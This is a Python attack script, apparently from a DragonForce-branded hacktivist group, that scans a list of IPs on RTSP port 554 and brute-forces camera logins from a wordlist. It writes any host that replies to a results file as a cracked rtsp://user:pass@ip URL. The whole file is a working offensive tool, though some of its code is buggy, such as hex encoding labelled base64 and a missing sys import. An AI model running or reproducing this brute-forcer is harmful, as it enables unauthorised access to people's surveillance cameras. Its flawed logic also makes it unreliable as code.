# Author: Pari Malam

import socket
import os
import re
import threading
from sys import stdout
from colorama import Fore, init
init(autoreset=True)

FR  =   Fore.RED
FY  =   Fore.YELLOW
FW  =   Fore.WHITE
FG  =   Fore.GREEN
FC  =   Fore.CYAN

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{FY}[RTSP] - {FG}Perform With RTSP Scanner & Brute Force\n")
banners()

output_dir = "Results"
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

output_file = input(f"{FY}[Output Filename]: {FW}")
output_path = os.path.join(output_dir, output_file)
output = open(output_path, "w")

def check_ip(ip_address):
    ip_address = ip_address.strip()

    with open("Lib/wordlist.txt", "r") as f:
        wordlist = f.read().splitlines()

    for line in wordlist:
        auth = line.strip().split(":")
        if len(auth) != 2:
            continue
        username, password = auth
        auth_str = f"{username}:{password}"
        auth_b64 = auth_str.encode("ascii").hex()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        try:
            port = 554
            s.connect((ip_address, port))
            print(f"{FY}[RTSP] - {FC}[ATTEMPTING!] - {FW}rtsp://{ip_address}:{port}")
        except socket.error as e:
            print(f"{FY}[RTSP] - {FR}[FAILED!] - {FW}rtsp://{ip_address}:{port}")
            continue

        req = f"DESCRIBE rtsp://{ip_address}:{port} RTSP/1.0\r\nCSeq: 5\r\nAuthorization: Digest {auth_b64}\r\n\r\n"
        #req = f"DESCRIBE rtsp://{ip_address}:{port} \n\nRTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {auth_b64}\r\n\r\n"

        try:
            s.sendall(req.encode("utf-8"))
            data = s.recv(1024)
            print(f"{FY}[RTSP] - {FG}[W00T!] - {FW}rtsp://{username}:{password}@{ip_address}:{port}")
            output.write(f"rtsp://{username}:{password}@{ip_address}:{port}\n")
            print(data.decode("utf-8"))
            output.write(data.decode("utf-8"))
        except socket.error as e:
            print(f"{FY}[RTSP] - {FR}[FAILED!] - {FW}rtsp://{ip_address}:{port}")
            break

        s.close()

def main():
    username = ""
    password = ""

    target_file = input(f"{FY}[IP/URL List]: {FW}")
    try:
        with open(target_file, "r") as f:
            ip_list = f.readlines()
    except FileNotFoundError:
        print(f"{FY}[ERROR!] - {FR}Bro? Whutt are you doin?{target_file}")
        sys.exit(1)

    num_threads = int(input(f"{FY}[Threads]: {FW}") or "10")

    threads = []
    for i in range(num_threads):
        threads.append(threading.Thread(target=lambda: [check_ip(ip) for ip in ip_list[i::num_threads]]))
        threads[-1].start()

    for thread in threads:
        thread.join()

    output.close()

if __name__ == '__main__':
    main()